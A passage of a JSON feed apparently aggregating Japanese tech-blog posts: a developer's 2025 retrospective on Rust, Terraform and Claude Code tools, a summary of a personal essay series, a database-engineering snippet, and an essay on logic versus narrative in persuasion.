Naoki","authorId":"nnaka2992"},{"title":"2025年、nwiizoが作ったソフトウェア","link":"https://syu-m-5151.hatenablog.com/entry/2025/12/31/232623","contentSnippet":"はじめに2025年が終わろうとしている。先日、「なぜ『何でも作れる時代』に私は作れないのか」という記事を書いた。「代表作」がないという焦り、量をやることの重要性、そして引き算の必要性。書きながら、自分の弱さと向き合った。syu-m-5151.hatenablog.comあの記事で「2026年は20個作る」と宣言した。その前に、2025年に何を作ったのか振り返っておきたい。振り返ると、この1年は「自分が欲しいもの」をひたすら作り続けた年だった。誰かに頼まれたわけでもなく、バズを狙ったわけでもなく、ただ「これがあったら便利なのに」という衝動に従って、キーボードを叩き続けた。「3回同じ不便を感じたら作る」というルールを自分に課している。cctxは3回目の設定ファイル書き換えで、cargo-autoddは3回目のCargo.toml編集で生まれた。前回の記事で書いた「隙間家具」を、実際に作っていた1年だった。11個のリポジトリを公開し、合計900以上のスターをいただいた。正直に言えば、通知が来るたびに見てしまう。でも、スターが多くても使われないツールはある。逆に、スター10でも毎日使っているツールがある。自分にとっての成功の定義を「毎日使うか」に変えてから、気持ちが楽になった。Claude Codeと過ごした1年2025年は、Claude Codeと共に過ごした年だった、と言っても過言ではない。cctxClaude Codeを使い込むうちに、設定を切り替えたくなる場面が増えた。仕事では制限をかけたい、個人プロジェクトでは自由にやりたい。kubectxを使ったことがある人なら分かるだろうが、あの「サクッと切り替える」感覚が欲しかった。だからcctxを作った。cctx work と打つだけで、仕事モードに切り替わる。cctx - で前のコンテキストに戻る。それだけのツールだが、毎日使っている。毎日使うから、これは成功だ。github.comclaudelyticsClaude Codeをどれくらい使っているのか、可視化したくなった。トークン消費量、コスト、セッションごとの使用パターン。数字で見えると、自分の開発スタイルが見えてくる。TUIを作り込んで、眺めているだけで楽しいものにした。作っていて気づいたことがある。「正確なデータ」より「見たくなるUI」の方が継続利用に繋がる。最初はCSVエクスポートに注力したが、結局TUIの見た目を磨いた時間の方が長かった。github.comccatCLAUDE.mdというファイルが増えてくると、管理が面倒になる。どこに何を書いたか分からなくなる。インポートチェーンが複雑になる。だから分析ツールを作った。地味だけど、自分には必要だった。github.comccswarmこれは少し野心的なプロジェクトだった。複数のAIエージェントを協調させて、大きなタスクを分割して処理する。Git worktreeで並列開発を実現する。「Sangha」という仏教にインスパイアされた民主的意思決定システムを入れたのは、ちょっとした遊び心だ。正直、まだ実験段階で、自分でも使いこなせていない。でも「AIエージェントの協調」という方向性は間違っていないと思っている。来年、もう少し実用的なものにしたい。github.comRustへの愛なぜRustを選ぶのか。理由はシンプルで、ただ好きだからだ。でも「好き」の中身を分解すると、いくつかの要素がある。まず、型システムがAIと相性が良い。Claude Codeにコードを書かせると、Pythonでは「動くけど大丈夫？」という不安が残る。Rustでは、コンパイラが通ればほぼ安全だという確信がある。AIが生成したコードでも、コンパイラが厳しくチェックしてくれる。この安心感は大きい。そして、丁寧なエラーメッセージ。Rustのコンパイラは「ここが間違っている」だけでなく「こうすれば直る」まで教えてくれる。学習を助けてくれる先生のような存在だ。使うほど信頼が増す。所有権や型システムの「難しさ」は、将来の保守性を高めるための設計だと理解している。大規模・長期運用での事故を防ぐための仕組み。楽ではないが「裏切らない」という安心感がある。だから何度でも選ぶ。cargo-autoddRustを書いていると、Cargo.tomlの依存関係管理が面倒になることがある。ソースコードにuse serde_jsonと書いたら、自動で依存関係に追加してほしい。逆に、使わなくなったcrateは消してほしい。そんな怠惰な願望から生まれたツール。作っていて学んだことがある。ASTパーサーを書いていた。「完璧に解析する」より「80%の精度で10倍速い」方がユーザー体験は良い。完璧主義がUXを損なう好例だった。github.comcargo-couplingVlad Khononovの「Balancing Coupling in Software Design」を読んで感銘を受けた。結合度と凝集度のバランス、距離と変更頻度の関係。これをRustプロジェクトで可視化したら面白いんじゃないか。そう思って作り始めたら、想像以上に深い世界が広がっていた。Web UIを付けて、グラフを眺められるようにした。自分のコードを分析した。予想以上に結合度が高いモジュールを発見した。「ここ、分割した方がいいな」と気づけたのは収穫だった。ツールを作ることで、自分のコードの問題が見えてくる。github.comcargo.nvimNeovimでRustを書いている。:CargoBuildと打つだけでビルドが走り、フローティングウィンドウに結果が表示される。エディタから手を離さずに開発サイクルを回せる。些細なことだけど、この積み重ねが開発体験を変える。github.comTerraformとの格闘インフラをコードで管理するのは素晴らしい。でも、時にはTerraformと格闘することもある。tfmcpAIにインフラを任せるのは危険か。答えは「条件による」だ。tfmcpで設けた制限は3つ。本番環境は読み取り専用。全操作の監査ログを記録。destructiveな変更は人間の承認必須。この制限下なら、AIはterraform planを高速で回す優秀なアシスタントだ。危険なのは「AIに任せること」ではなく、「制限なく任せること」だ。この区別が重要だと、作りながら実感した。github.comtfocusTerraformのリソースターゲティングは麻薬だ。一度使うと「今回も大丈夫」と手が伸びる。状態の不整合が蓄積し、ある日terraform applyが破滅的な差分を出す。それでもtfocusを作ったのは、消防士にも斧が必要なように、障害対応には「禁じ手」が要るからだ。peco風のインタラクティブUIを付けて、素早くリソースを選択できるようにした。READMEに「緊急用ツール」と明記した。日常使いした瞬間、このツールは害になる。github.com開発者のための小さな道具たちvibe-ticketチケット管理システムは世の中に溢れている。Jira、Linear、GitHub Issues。でも、ターミナルで完結する、Git worktreeと統合された、開発者のためのチケット管理が欲しかった。MCPサーバーとしても動くようにした。AIアシスタントに「さっき見つけたバグのチケット作って」と言えば、作ってくれる。github.cominstrument-rsオブザーバビリティは大切だ。でも、どこにトレースを入れるべきか、どこにログを仕込むべきか、判断が難しい。コードを静的解析して、「ここに入れるといいよ」と教えてくれるツールがあれば便利だと思った。HTTPエンドポイントから実行パスをトレースして、クリティカルパスを特定する。まだ実験的なプロジェクトだけど、可能性を感じている。github.com失敗と学び11個公開したが、実は3個はアーカイブした。最初に作ったツールは設計が甘く、2週間で書き直した。公開して反応ゼロだったものもある。前回の記事で「捨てやすく作る」と書いた。アーカイブした3個は、まさにそれを実践した結果だ。状況が変わって不要になったもの、設計を間違えたもの。捨てることに罪悪感はない。役目を終えただけだ。ヒットの予測は難しい。「これは絶対使われる」と思ったものがスター20で止まり、「まあ自分用だし」と思ったcctxが一番使われている。予測できないなら、作りたいものを作るしかない。前回の記事で「量をやることで、初めて見えてくるものがある」と書いた。11個作って、ようやくその意味が分かってきた。最後にccswarmを公開して3日後、見知らぬ人からIssueが来た。「この機能を追加してほしい」と。実装して返信したら「ありがとう」と返ってきた。それだけのやり取りだったが、不思議と孤独じゃなくなった。顔も知らない人と、コードで繋がる感覚。SNSのいいねとは違う何かがあった。前回の記事で「代表作がない」と書いた。11個作っても、まだ「これだ」とは言えない。でも、前より近づいている気がする。2025年の11個は、2026年の20個への助走だ。すべてのプロジェクトはMITライセンスで公開している。もしあなたが「こんなツールがあれば」と思っているなら、まず作ってみてほしい。完璧じゃなくていい。私のツールも初版はバグだらけだった。READMEを書いて、v0.1.0をリリースする。それだけで世界が変わる。使ってくれる人がいるかもしれない。いなくても、自分が使えばいい。2025年、ありがとう。2026年は、もっと狂う。","isoDate":"2025-12-31T14:26:23.000Z","dateMiliSeconds":1767191183000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"SREとPlatform Engineeringの交差点としてのデータベースエンジニア","link":"https://zenn.dev/nnaka2992/articles/dbe_as_a_crossing_of_sre_and_platform_engineering","contentSnippet":"この記事は3-shake Advent Calendar 2025 最終日の記事です。データベースは従来から安全な変更を適用するには難易度が高い場合もあり、最悪の場合データロストを引き起こす変更しづらさが課題としてあります。現代のシステム開発では開発者によるデータベースの頻繁な変更は当たり前であり、変更しづらさが、そのままDevExの低下につながります。データベースの信頼性を支えるにも、DevExを向上させるにも、一定のデータベースの知見が必要になります。一方でデータベースに一定の知見をもつエンジニアや専門とするエンジニアは、インフラエンジニアやアプリケーションエンジニアに比べ...","isoDate":"2025-12-31T08:14:34.000Z","dateMiliSeconds":1767168874000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"おい、おい、おい、おい、おい、おい、おい、おい、おい、おい、おい、おい、おい、おい、おい、おい、","link":"https://syu-m-5151.hatenablog.com/entry/2025/12/30/083324","contentSnippet":"はじめに誰もまとめてくれないので自分でまとめます。こんなに悲しいことはありません。2025年11月から12月にかけて、「おい、〜」というシリーズでブログを15本書きました。登壇もしました。合計16本です。誰かがまとめ記事を書いてくれるかなと思っていました。待っていました。誰も書いてくれませんでした。年末です。仕方がないので自分で書きます。シリーズの始まり今年の8月、本を書かないかという話が来ました。嬉しかったです。企画を練りました。構成を考えました。8月、9月、10月といろいろやり取りをしていたのですが、いろんな諸事情で立ち消えになりました。悔しかったです。本を出せなかったことが悔しかったのではない。結局何にもならなかった自分が悔しかった。もっと準備できたはずだ。もっと詰められたはずだ。その後悔が残りました。でも、本の企画のために書いた下書き原稿が8本くらいありました。本にならないなら、ブログに書けばいい。そう思って始めたのが「おい、〜」シリーズです。30歳になったこともきっかけでした。5月に「20代最後の一週間を生きるエンジニア、あるいは30歳の扉の前でうろたえる男の独白」というとても長いブログを書きました。20代が終わることへの焦り、不安、でも少しの期待。そのときに声かけていただいたのが、「おい、〜」シリーズとして出てきたものです。syu-m-5151.hatenablog.com20代の頃は「なんでもできる」と思っていました。30代になって、「できない」を認められるようになった。それは諦めではなく、等身大の自分を見つめられるようになったということです。15本を通して書いていたのは、結局そのことだったのかもしれません。「おい、部屋を掃除しろ」から始まりました。下書きを消化したあとも、言いたいことが止まらなくなりました。無限に書いても良くないので、週に1回のペースに決めました。自分を律するために「おい、週一で書け」とは書きませんでした。結果、15本になりました。15本の記事は、3つのカテゴリに分かれます。まず生活の基盤を整え、次に思考を鍛え、最後にその思考で仕事や人間関係に臨む。この順番で読む必要はありませんが、私の中ではこの流れがありました。生活習慣編おい、部屋を掃除しろ掃除の話ではありません。自分を大切に扱う習慣の話です。部屋が汚い人間に、コードをきれいに書けるわけがない。因果関係なんてないし、汚い部屋の凄腕エンジニアなんていくらでもいる。でも、知っている人はみんな適当な時期に結婚などしてなんとかなったか、心か身体を壊して生活を改めたか、消えていった。因果はわからないが、意味のわからない経験則としてある。毎日5分の掃除から始める規律の美学について書きました。syu-m-5151.hatenablog.comおい、一つずつやれSlack、メール、GitHub、全部同時に見ていると「忙しいのに何も終わらない」状態になります。これはおそらく忙しいのではなく、大量のタスク切り替えに対してコストを払っているだけです。仕事ができる人のイメージは、勝手に「マルチタスクができる人間」だと思っていました。しかし自分にその力はどうやらなさそうで、実際できていませんでした。ただ能力の限界まで「中途半端を量産する人間」でした。1日25分、1つのことだけに集中することから始めました。タスク切り替えの過払い金を整理した、という表現が正しいかもしれません。syu-m-5151.hatenablog.comおい、スマホを置け技術書が読めない。集中力が続かない。意志が弱いのだと思っていました。違いました。スマホに最適化された脳でした。私たちの世代は高校生の頃からスマホに触れてきた。15秒ごとに報酬をくれるアプリに慣れた脳が、30分かけて一つの概念を理解する作業に耐えられるわけがない。これは人生が壊れるな、という実感がありました。自分より下の世代は、もっと大変だろうなと思いました。syu-m-5151.hatenablog.comおい、本を読め「本を読まない人は生き残れない」という強迫的なメッセージへの違和感があります。いつから読書は「生き残るための手段」になったのか。効率的に知識を得るための読書は続かない。義務感で読む本は頭に入らない。ただ楽しいから読む。それだけでいい。そういう価値観もあるのだと、知ってもらえたらと思っていました。私は今も、子供の頃に初めて図鑑を開いたときと同じ気持ちで本を読んでいます。正直、楽しければなんでもいいと思っています。読者やフォロワーが楽しんで、結果として生き残ってくれれば、それでいい。syu-m-5151.hatenablog.comおい、休め休んでいるのに休めていない、という問題があります。ソファで横になってスマホを見ている。一見すると堕落の象徴のようでもあり、休息のようでもある。しかし残念ながら、これは休息ではありません。低負荷の作業です。脳は休んでいない。判断を続けている。スクロールするかどうか。この動画を見るかどうか。このツイートに反応するかどうか。AI時代は判断を求められる機会が増える一方です。現代では意識的に「何もしない」時間を作らないと、脳が壊れます。「じゃあお前はブログを書き続けて休んでないじゃないか」という指摘があると思いますが、その鋭い刃は収めていただけると助かります。syu-m-5151.hatenablog.com思考法編おい、冷笑すんなインターネットと冷笑は、相性が良すぎます。140字で専門家を論破した気になれる。何年も積み上げてきた人の仕事を、背景も知らずに「それ、意味あるんですか」と切り捨てられる。「専門性なんて要らない」「結局ポジショントークでしょ」——そんな言葉が、何も作ったことのない人から発せられている。私自身、視野を広げすぎて世界の複雑さに圧倒され、冷笑主義に陥った経験があります。何を見ても「まあ、そうなるよね」「どうせ変わらないよ」と思うようになっていた。達観した気になっていた。賢くなった気がしていた。違った。何も生み出さない人間になっていただけでした。冷笑は「どうせ無理」で終わる。批判は「ここがダメ」で終わる。批評は「ここがダメだから、こうすればいい」まで踏み込む。私は冷笑で止まっていた。一番楽で、一番何も残らない場所に。若い頃に冷笑してきたものが、今になって本当に大切だとわかる。それが少し悔しい。syu-m-5151.hatenablog.comおい、内省しろ内省と反省は違います。反省は「悪かった、次は気をつけます」で終わる。そして同じミスを繰り返す。私がそうでした。何度も反省した。何度も同じ失敗をした。反省とは、過去に頭を下げる行為でしかなかった。内省は違う。「なぜそうなったのか」を掘り下げて、構造を理解し、仕組みごと変えるプロセスです。自分を責めるのではなく、自分を観察する。毎日30秒でいい。寝る前に「今日、なぜあの判断をしたのか」を考える。それだけで少しずつ変わります。syu-m-5151.hatenablog.comおい、言語化しろ2025年、言語化神話が爆誕しました。「言語化できれば理解できる」「言語化できないのは思考が浅い証拠」——そんな空気が広がっている。確かに、言葉にできない領域があまりに広い人にとっては、その神を信じることで救われることもあります。言葉にする努力が思考を前に進めることもある。しかし、普通の大人には言語化できないものがあります。「なんとなくこっちの方がいい」という直感。説明できないけど手が動く技術。身体に染み込んだ知識、実践の中で培われた勘、創造的な跳躍、感情ヒューリスティック。これらを全部言葉にしようとすると、かえって嘘になる。言葉にした瞬間、丸められる。削られる。本当はもっと複雑で、矛盾していて、揺らいでいるものが、きれいに整理された途端に別物になる。「完璧に言語化できた」と思ったら、何か大事なものを落としている証拠かもしれない。不完全な変換でいい。「まだ言葉にできない何か」を抱えている感覚こそが、次の成長を生みます。syu-m-5151.hatenablog.comおい、つなげろ問題解決には「つなげること」と「断つこと」の両面があります。知識と知識をつなげて解決策を見つける。異なる領域の経験を結びつけて、新しい発想を得る。しかし、間違ったつながりを断つ勇気も必要です。「前もこうだったから」という過去の成功体験が、今回の失敗を招くことがある。AIに聞けば答えは出る。でも、自分でつなげる経験をしないと、応用が効かない。なぜその答えに至ったのか、プロセスが身につかない。「AIが教えてくれた答え」と「自分で見つけた答え」は、同じ答えでも身につき方が違う。苦労して見つけた答えは、次の問題を解く足場になる。与えられた答えは、その場で消える。syu-m-5151.hatenablog.comおい、類推するな所有権を「本の貸し借り」に例えて理解しました。わかった気になりました。腹落ちした感覚すらあった。しかし実際にコードを書いたら、例えが成立しない場面だらけでした。本は返却されても同じ本だが、所有権はそうではない。そういう経験は意識的にも無意識的にもやってしまうと思います。類推は便利ですが危険です。複雑なものを飲み込みやすくする代わりに、本質からズレた理解を植えつける。入り口としては使える。でも、判断するときは具体に戻る。「本の貸し借りだから...」ではなく「Rustの所有権のルールでは...」で考える。例え話で納得したら、そこで立ち止まって、例えを捨てる勇気を持つ。syu-m-5151.hatenablog.com仕事・対人編おい、対話しろ会議で「話しているが対話していない」場面があります。みんな口だけは喋っている。でも誰も聞いていない。相手の発言が終わるのを待っているだけ。その間に自分の意見を頭の中で整理している。相手の言葉を受けて考えを変える気がない。これは対話ではない。順番にモノローグを発表しているだけです。対話の本質は、相互の世界観を認識し、理解を深めるプロセスにある。相手の言葉を聞いて、自分の考えが変わる余地を残す。論破ではなく理解を目指す。勝ち負けではない。「なるほど、そういう見方もあるのか」が対話の成果です。syu-m-5151.hatenablog.comおい、がんばるな「頑張ること自体が目的化していた」という反省があります。遅くまで残って、休日も働いて、「頑張っている自分」に酔っていた。忙しさを充実感と錯覚していた。成果は出ていなかった。いや、正確には見ていなかった。過程に満足して、結果を直視していなかった。環境とのミスマッチを認識し、持続可能なペースに切り替えたら、むしろ成果が出るようになった。頑張りを減らしたのに成果が増える。皮肉だが、これが現実だった。公開した翌日、「いや、待てよ」と思いました。syu-m-5151.hatenablog.comおい、努力しろ前日の「がんばるな」への自己反論です。24時間で意見が変わりました。というわけではないです。読者は混乱したと思います。「頑張らなくていい」という言葉が、怠惰の免罪符として使われる危険性に気づいた。「無理しなくていい」が「やらなくていい」にすり替わる瞬間がある。量をこなさないと見えない景色がある。苦しみを乗り越えた経験がないと、乗り越え方がわからない。限界を知るには、一度限界まで行く必要がある。矛盾しているように見えますが、矛盾していません。両方本当です。「頑張りすぎるな」と「頑張らないと見えないものがある」は、同時に成り立つ。問題は、今の自分がどちら側にいるかを見極めることです。syu-m-5151.hatenablog.comおい、戦略を語れ「戦略」という言葉が形骸化しています。「戦略的に進めましょう」と言う人に「具体的にどういう戦略ですか」と聞くと、答えられないことが多い。「戦略」が「なんとなく賢そうな進め方」の意味になっている。戦略の本質は「何をやらないかの選択」です。全部やるのは戦略ではない。総花的にリソースを配分するのは、戦略がないことの証明です。限られた時間とエネルギーを、どこに集中させるか。何を意図的に捨てるか。エンジニアも「これは作らない」と言える立場になるべきです。「作れるけど作らない」という判断ができることが、本当の技術力かもしれません。syu-m-5151.hatenablog.comおい、論理で人が動くと思ってるのか論理的に正しい提案でも通らないことがあります。データを揃えた。根拠を示した。反論の余地がないほど完璧な提案書を作った。却下されました。なぜか。人は論理だけでは動かない。正しさだけでは、心が動かない。「このシステムは非効率です」より「先月、この非効率のせいで3時間残業しました」の方が通る。数字より、1人の体験談。グラフより、具体的な苦労話。人は物語で納得し、論理で自分を正当化する。だから、まず物語で心を動かし、その後で論理を添える。順番が逆だった。完璧な論理を用意する前に、「誰の、どんな困りごとを解決するのか」を語るべきでした。syu-m-5151.hatenablog.com登壇12月5日、Forkwell Communityで「おい、テックブログを書け」という登壇をしました。元々文章が苦手でした。今も苦手です。それでも書き続けたら、登壇を頼まれるようになりました。苦手なまま登壇しています。緊張で声が震えます。けれど登壇しています。出発点の低さは到達点を決めない。苦手なまま続けて消えていった人も山ほど見てきた。違いは何か。苦手なことを自覚した上で、苦手なまま出す覚悟をした。完璧を目指していたら続かなかった。syu-m-5151.hatenablog.com何を言いたかったのか15本を書いていて気づいたことがあります。それぞれの記事がつながっていく感覚がありました。「スマホを置け」と「休め」、「内省しろ」と「言語化しろ」。しかし同時に、全く反対のことも言っている。「がんばるな」の翌日に「努力しろ」。一貫性がない。でも、そういうものだと思っています。「おい、〜」シリーズは、飲み屋で語りたいことを適当に語っているような記事です。整合性を気にしていたら書けなかった。完璧を目指してたら書けなかった。矛盾だらけの15本ですが、振り返ると1つだけ共通点がありました。どの記事も「手段が目的化していないか」を問うていた気もする。掃除も、読書も、努力も、論理も、すべて何かのための手段です。その「何か」を見失っていた。効率と最適化に追われて、「なぜそれをやるのか」という問いを忘れていた。タスクをこなすことが目的になり、タスクの先にある価値を見失っていた。15本を通して言いたかったのは、そのことです。スマホで時間を潰すな。マルチタスクで忙しいふりをするな。冷笑で賢いふりをするな。論理だけで人を動かそうとするな。がんばることを目的にするな。でも努力から逃げるな。矛盾だらけです。人間は矛盾しています。それでいいと思っています。おわりに本の企画が立ち消えになったとき、正直落ち込みました。でも結果的に、ブログという形で書きたいことを全部書けた。本になっていたら、編集者に「矛盾してます」と言われて、どちらかを削っていたと思います。ブログでよかった。15本も書いて、誰も読んでいないかもしれません。誰もまとめてくれなかったということは、そういうことなのでしょう。あるいは、みんな忙しいだけかもしれない。そう思うことにしています。それでも書きました。自分のために書きました。30歳の自分から、40歳の自分への手紙です。「おい、お前、ちゃんとやってるか」10年後に読み返して、恥ずかしくなるかもしれません。「やっぱり正しかった」と思うかもしれません。どちらでもいい。でも、同じことを書いていたら。同じ悩みを抱えていたら。40歳の自分がこれを読んで、何も変わっていなかったら。それが一番怖い。来年も書きます。誰かがまとめてくれることを期待しています。でも、たぶんまた自分でまとめることになる。飽きたらやめます。だから普通に褒めてください。人に勧めてください。このブログが良ければ読者になったり、nwiizoのXやGithubをフォローしてくれると嬉しいです。","isoDate":"2025-12-29T23:33:24.000Z","dateMiliSeconds":1767051204000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"おい、論理で人が動くと思ってるのか","link":"https://syu-m-5151.hatenablog.com/entry/2025/12/29/160746","contentSnippet":"はじめに数年前の、ある金曜日の夜のことだ。会議は完全な失敗に終わった。会議室を出て、エレベーターのボタンを押しながら、私はこの文章を書こうと決めた。書き上げるまでにずいぶん時間がかかってしまったので、当時の思いとは少し違っているかもしれない。あの会議で「論理的に正しいことを言ったのか」と問われれば、言った。間違いなく言った。データも揃えた。根拠も示した。反論の余地がないほど、正しいことを言ったはずだった。だが、誰も動かなかった。私の発言が終わった瞬間、会議室の空気は凍りついた。誰も何も言わない。居心地の悪い沈黙が流れ、やがて別の話題へと移っていった。正しいことを言ったはずなのに、私は敗北感を覚えた。当時、私はシニアエンジニアになったばかりだった。部下はいない。それでも「組織全体の技術選定に責任を持て」と言われる。命令する権限はない。しかし説得しなければならない。予算を握っているわけでもない。それでもチームを動かさなければならない。これを読んでいる人の中にも、同じ経験をした人がいるのではないだろうか。「なぜ伝わらないのだ」と、帰りの電車の中で自問したことがある人が。正直に告白すれば、当時の私は根本的な勘違いをしていた。論理的に正しければ、人は動くものだと思っていた。正しい推論を積み重ねれば、相手は納得せざるを得ない。そう信じて疑わなかった。だが、違った。人が動くのは、論理ではなかった。もっと別の何かだった。私はそれを「物語」と呼ぶことにした。なぜそう呼ぶのか。それを、これから書いていく。このブログが良ければ読者になったり、nwiizoのXやGithubをフォローしてくれると嬉しいです。論理学が扱うもの私も昔、論理学を学んだとき、これで人を説得できると思った。正しい推論を積み重ねれば、相手は納得せざるを得ない。そう信じていた。今思えば、かわいいものだ。論理学は、推論の形式を扱う学問だ。内容ではなく、形式を。「すべての人間は死ぬ。ソクラテスは人間だ。ゆえにソクラテスは死ぬ」——これがアリストテレス以来の三段論法です。この推論が正しいのは、ソクラテスが誰かとか、死とは何かという内容とは関係ありません。形式が正しいから、結論は必然的に正しいのです。論理学には2つの柱がある。演繹と帰納だ。演繹は、前提から結論を必然的に導く。「すべてのAはBである」という全称命題から、個別の結論を導く。前提が真で、推論形式が正しければ、結論は必ず真になる。数学の証明はこれだ。帰納は、個別の事例から一般法則を導きます。「このカラスは黒い」「あのカラスも黒い」を繰り返して、「すべてのカラスは黒い」と結論する。しかし、帰納には必然性がありません。次に見るカラスが白い可能性もあります。科学の仮説はこの帰納に基づいています。エンジニアとして、私は両方を使う。型システムは演繹だ。型が合っていれば、その部分は正しく動く。テストは帰納だ。このケースで動いた、あのケースでも動いた。だから「おそらく」正しい。論理学が教えてくれる重要なことがあります。論理的に正しい推論でも、前提が間違っていれば結論は間違います。「すべてのエンジニアはコーヒーを飲む。田中はエンジニアだ。ゆえに田中はコーヒーを飲む」——この推論は論理的に正しい。でも、前提が間違っています。論理は形式の正しさを保証しますが、内容の正しさは保証しません。そして、日常会話で「論理的」と呼ばれるものは、この厳密な意味での論理ではない。では、日常で「論理的」と呼ばれているものは、いったい何なのか。そして、論理は本当に「無力」なのか。私はそうは考えません。論理が効かないのではなく、使う順番を間違えているだけかもしれない。論理が効く瞬間と、効かなくなる瞬間がある。その違いは何か。論理が効くのは、相手がすでに「聞く準備」ができているときだ。信頼関係がある。問題意識を共有している。結論を受け入れる土壌がある。そういう状態で論理を使えば、「なるほど、確かにそうだ」となる。論理が効かなくなるのは、その準備ができていないときだ。相手が防御姿勢に入っている。「この人の話は聞きたくない」と思っている。そういう状態で論理を振りかざしても、「理屈っぽい」「押し付けがましい」と感じられるだけだ。論理が最初に来ると失敗しやすいのは、これが理由だ。相手の心が開いていないうちに正論をぶつけても、反発を招くだけ。まず共感し、信頼を築き、「この人の話なら聞いてみよう」という状態を作る。論理はその後だ。論理は「納得を作る道具」なのか、「正しさを確認する道具」なのか。私の答えは「両方だが、順番が違う」だ。正しさを確認するのは最初。納得を作るのは最後。自分の中で論理的に正しいことを確認してから、相手に伝えるときは物語で包む。論理は骨格で、物語は肉だ。骨だけ見せても、人は食べたいと思わない。論理的誤謬という問題論理学は、推論の「正しくない形式」も分類している。論理的誤謬だ。「Aさんは実績がないから、Aさんの意見は間違っている」——これは人身攻撃の誤謬だ。発言者の属性と、発言内容の真偽は別の問題だ。「みんながそう言っているから正しい」——これは多数論証の誤謬だ。多数派であることは、正しさの証明にはならない。「前例がないからやるべきではない」——これは前例への訴えだ。前例がないことと、やるべきでないことは別の問題だ。会議室で飛び交う「論理的」な議論を観察してみてほしい。これらの誤謬がどれだけ多いことか。私も、今日の会議で3つは使った気がする。しかし、ここで興味深いことがある。論理的誤謬を含む議論でも、人は納得する。むしろ、厳密に論理的な議論よりも、誤謬を含む議論のほうが説得力を持つことがある。なぜか。誤謬が含まれていると、かえって「人間らしさ」を感じないか。完璧に論理的な人は、どこか冷たい印象を与える。「この人は機械なのか」と思ってしまう。一方、多少の飛躍や感情的な訴えがある人は、「血が通っている」と感じる。厳密さを捨てることで得ているものがある。親近感だ。「この人も自分と同じように考えている」という共感だ。論理的な完璧さは、時として障壁になる。「この人には敵わない」と思わせてしまうと、対話が成立しなくなる。誤謬を許容しているのは、聞き手か、語り手か。私の答えは「両方」だ。語り手は、厳密さよりも伝わりやすさを優先している。聞き手は、正しさよりも納得しやすさを優先している。両者の暗黙の合意によって、誤謬は見逃される。これは悪いことばかりではない。日常のコミュニケーションで、すべてを厳密に検証していたら話が進まない。ある程度の「緩さ」は、社会を潤滑にしている。問題は、その緩さがどこまで許されるかだ。アリストテレスは、人を説得する技術を3つに分けた。ロゴス（論理）、パトス（感情）、エトス（人柄・信頼）だ。論理学が扱うのはロゴスだけだ。しかし、人間を動かすには3つすべてが必要になる。「論理的に正しいのに伝わらない」と悩むとき、私たちはロゴスだけで勝負しようとしている。パトスとエトスが欠けている。逆に、論理的誤謬を含んでいても人が動くとき、パトスとエトスがロゴスの欠陥を補っている。これが、論理学と「論理的に見えること」の決定的な違いだ。「論理的に見える」の解体世間で「論理的」と言われる人を、よく観察してみてほしい。彼らは本当に学術的な意味での論理を使っているだろうか。三段論法を厳密に適用しているだろうか。演繹的推論を正確に展開しているだろうか。違う。彼らがやっているのは、相手が「なるほど、確かに」と思える具体例をサッと出すことだ。データや証明だけじゃなくて、実感できる話で納得させている。では、日常で「論理的」と呼ばれているものは、何を代替しているのか。本来は感情で決めていることを、論理で覆っていないか。「なんとなく嫌だ」を「リスクが高い」と言い換える。「この人と仕事したくない」を「スキルセットが合わない」と言い換える。感情的な判断を、論理的な装いで正当化している。本来は信頼で決めていることを、論理で覆っていないか。「この人が言うから」を「データに基づいている」と言い換える。「前からこうだったから」を「実績がある」と言い換える。関係性や慣習に基づく判断を、客観的な根拠があるように見せている。本来は立場で決めていることを、論理で覆っていないか。「上が決めたから」を「戦略的に正しい」と言い換える。「予算がないから」を「費用対効果が低い」と言い換える。権力構造に基づく判断を、合理的な分析結果のように見せている。「論理的に説明した」という言葉は、責任回避になっていないか。「私が決めた」ではなく「論理的にこうなった」と言うことで、判断の責任を「論理」に押し付けている。でも、どの前提を選ぶか、どのデータを重視するか、それを決めたのは人間だ。論理は責任を引き受けてくれない。論理という言葉は、どんな場面で免罪符になるのか。「感情的になるな、論理的に考えろ」と言われたとき、相手の感情を封じ込める武器になっている。「論理的に正しいんだから従え」と言われたとき、対話を打ち切る口実になっている。論理という言葉が、思考停止の道具になることがある。「論理で動いた」ように見える行動を解剖してみよう。実際に何が作用しているのか。信頼がある。「この人が言うなら」という前提がすでに成立している。文脈がある。その結論を受け入れやすい状況がすでに整っている。同調圧力がある。周囲がすでに納得している空気がある。期待がある。その結論であってほしいという願望がある。論理は、これらの基盤の上で初めて機能する。基盤がなければ、どれだけ論理的に正しくても人は動かない。論理は感情の乗り物だ。乗り物だけあっても、燃料がなければ走らない。感情という燃料があって、初めて論理は目的地に到達する。しかし、この比喩はどこまで言い切ってよいのか。感情がない状態で論理が機能する場面は存在するか。数学の証明を考えてみてほしい。純粋に形式的な操作として、感情抜きで成立するように見える。しかし、その証明を「面白い」「美しい」と感じる心がなければ、誰が数学を続けるだろうか。論理の営みを支えているのは、やはり感情だ。感情が強すぎるとき、論理は何を失うのか。怒りに支配されているとき、論理は武器になる。相手を傷つけるための道具になる。悲しみに沈んでいるとき、論理は機能しなくなる。「わかっているけど、できない」という状態になる。感情が強すぎると、論理は歪むか、停止する。論理と感情は主従関係なのか、相互依存なのか。私の答えは「相互依存」だ。論理が感情を制御することもある。「怒りに任せて発言するのはやめよう」と論理が感情をなだめる。感情が論理を駆動することもある。「この問題を解決したい」という情熱が、論理的思考を加速させる。どちらが主人というわけではない。両者が互いに影響し合っている。うまく言葉にできる人は、論理が強いのではない。相手を見ている。相手が何を知っていて、何を知らないか。何を信じていて、何に不安を感じているか。その理解があるから、言葉が届く。論理は単体では人を動かさない。ここでもう一歩踏み込んでみます。「私は論理的です」という態度自体が、1つのナラティブではないでしょうか。「私は感情に左右されず、冷静に判断しています」という自己像を提示している。それ自体が物語を語っているということです。「AだからB」は、推論である前に、納得の物語です。原因と結果を結びつけ、聞き手を結論へと導く。それは「正しいから従うべき」ではなく「納得できるから受け入れる」という構造で機能しています。信じたい物語への依存ここまで、論理の限界と物語の力について語ってきた。しかし、もう一歩踏み込みたい問題がある。人は「信じるべき論理」ではなく「信じたい物語」を信じる。これは単なる傾向ではない。依存に近い。考えてみてほしい。データを見せられたとき、私たちは本当に中立的に判断しているだろうか。「この数字は何を意味するか」と問う前に、「この数字は自分の期待を裏付けているか」と無意識に判断していないか。期待に合致するデータは「やはり」と受け入れる。期待に反するデータは「本当なのか」と疑う。同じ論理、同じデータでも、自分の物語に沿っているかどうかで、受け取り方が変わる。これは認知